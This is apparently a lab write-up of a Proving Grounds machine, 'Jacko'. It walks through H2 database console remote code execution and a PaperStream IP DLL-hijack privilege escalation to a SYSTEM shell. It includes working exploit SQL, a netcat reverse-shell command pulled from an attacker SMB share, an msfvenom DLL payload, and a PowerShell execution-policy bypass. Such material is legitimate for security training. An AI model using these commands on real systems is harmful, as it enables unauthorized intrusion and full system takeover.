---
layout: post
title: PG | Jacko
subtitle: A machine best paired with a nice cup of coffee.
---

# Nmap Scan Results

~~~shell
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-26 15:02 UTC
Nmap scan report for 192.168.191.66
Host is up (0.015s latency).
Not shown: 65521 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: H2 Database Engine (redirect)
| http-methods: 
|_  Potentially risky methods: TRACE
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
5040/tcp  open  unknown
7680/tcp  open  pando-pub?
8082/tcp  open  http          H2 database http console
|_http-title: H2 Console
9092/tcp  open  XmlIpcRegSvc?
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2023-10-26T15:05:31
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 208.70 seconds
~~~

# Service Enumeration

## HTTP (TCP/80)

The target is hosting an Apache web server on port 80 that displays a guide on how to use a H2 Database Engine (Java and SQL)

## SMB (TCP/139, 445)

An SMB server is also running on the target, I attempted to connect via a NULL session however the attempt was denied
~~~shell
┌──(kali㉿kali)-[~/Desktop/Jacko]
└─$ smbclient -N -L //192.168.191.66                 
session setup failed: NT_STATUS_ACCESS_DENIED
~~~

## HTTP (TCP/8082)

Port 8082 is running the H2 Database console for remote management of the database software as shown below

![Jacko](/assets/img/JackoPG(1).png)

When clicking connect using the default loaded credentials (sa:) we are brought to the management console

![Jacko](/assets/img/JackoPG(2).png)

The left panel shows us our current user 'sa' has admin permissions and the current version is H2 1.4.199

![Jacko](/assets/img/JackoPG(3).png)

I searched for exploits relating to the H2 Database version 1.4.199 and found this [exploit](https://www.exploit-db.com/exploits/49384) which allows remote code execution by:
1. Writing a native java library to the H2 servers disk using the H2 function 'CSVWRITE'
2. Loads the library using 'java.lang.System.load'
3. Commands can then be issued via calling 'JNIScriptEngine.eval' which is a java interpreter that evaluates and issues the scripts we enter

~~~shell
-- Write native library
SELECT CSVWRITE('C:\Windows\Temp\JNIScriptEngine.dll', CONCAT('SELECT NULL "', CHAR(0x4d),CHAR(0x5a),CHAR(0x90),CHAR(0x00),CHAR(0x03),CHAR(0x00),CHAR(0x00)...;))

-- Load native library
CREATE ALIAS IF NOT EXISTS System_load FOR "java.lang.System.load";
CALL System_load('C:\Windows\Temp\JNIScriptEngine.dll');

-- Evaluate script
CREATE ALIAS IF NOT EXISTS JNIScriptEngine_eval FOR "JNIScriptEngine.eval";
CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("whoami").getInputStream()).useDelimiter("\\Z").next()');
~~~

To get my initial foothold I first started a netcat listener on port 8082 on my attack machine

~~~shell
┌──(kali㉿kali)-[~]
└─$ nc -nvlp 8082
listening on [any] 8082 ...
~~~

I then created an SMB share (as SMB is running on the target) and placed nc.exe (netcat) in the share

~~~shell
┌──(kali㉿kali)-[~/Desktop/Jacko]
└─$ impacket-smbserver share /home/kali/Desktop/Jacko -smb2support
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
~~~

I then ran my payload on the H2 console to connect to the share and execute nc.exe locally to create a remote connection to my netcat listener on port 8082

~~~shell
CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("cmd.exe /c //192.168.45.187/share/nc.exe -e cmd.exe 192.168.45.187 8082").getInputStream()).useDelimiter("\Z").next()');
~~~

I then recieved my initial foothold!

~~~shell
┌──(kali㉿kali)-[~]
└─$ nc -nvlp 8082
listening on [any] 8082 ...
connect to [192.168.45.187] from (UNKNOWN) [192.168.191.66] 49844
Microsoft Windows [Version 10.0.18363.836]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Program Files (x86)\H2\service>
~~~

When navigating around the filesystem I found an application in Program Files (x86) named PaperStream IP, I then searched it up for exploits and found [this](https://www.exploit-db.com/exploits/49382) exploit which is a DLL Hijacking vulnerability in which we can inject a payload to perform privilege escalation. This exploit works on version 1.42

![Jacko](/assets/img/JackoPG(4).png)

I then searched through the softwares directories looking to find the version, and found a file under C:\Program Files (x86)\PaperStream IP\TWAIN>type readmeenu.rtf that stated the version number 1.42 as shown below

![Jacko](/assets/img/JackoPG(5).png)

I generated the DLL payload reverse shell as discussed in the exploit (PaperStreamIP is stored in the Program Files x86 directory so we will need to generate a 32 bit payload not 64 bit)

~~~shell
┌──(kali㉿kali)-[~/Desktop/Jacko]
└─$ msfvenom -p windows/shell_reverse_tcp -f dll -o shell.dll LHOST=tun0 LPORT=4444
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of dll file: 9216 bytes
Saved as: shell.dll
~~~

I then transferred the payload via SMB to the target machine

~~~shell
C:\Users\tony>copy \\192.168.45.187\share\shell.dll
copy \\192.168.45.187\share\shell.dll
        1 file(s) copied.
~~~

I downloaded the exploit to my attack machine and edited the Payload variable to specify my reverse shell .dll

![Jacko](/assets/img/JackoPG(6).png)

I then started a netcat listener on port 4444, transferred the exploit via SMB and executed the exploit

~~~shell
┌──(kali㉿kali)-[~]
└─$ nc -nvlp 4444
listening on [any] 4444 ...
~~~

~~~shell
C:\Users\tony>copy \\192.168.45.187\share\49382.ps1
copy \\192.168.45.187\share\49382.ps1
        1 file(s) copied.
~~~
~~~shell
C:\Users\tony>C:\Windows\System32\WindowsPowershell\v1.0\powershell.exe -ep bypass C:\users\tony\49382.ps1
C:\Windows\System32\WindowsPowershell\v1.0\powershell.exe -ep bypass C:\users\tony\49382.ps1
Writable location found, copying payload to C:\JavaTemp\
Payload copied, triggering...
~~~

I then recieved the root (system) shell on my listener!

~~~shell
┌──(kali㉿kali)-[~]
└─$ nc -nvlp 4444
listening on [any] 4444 ...
connect to [192.168.45.187] from (UNKNOWN) [192.168.191.66] 49909
Microsoft Windows [Version 10.0.18363.836]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
~~~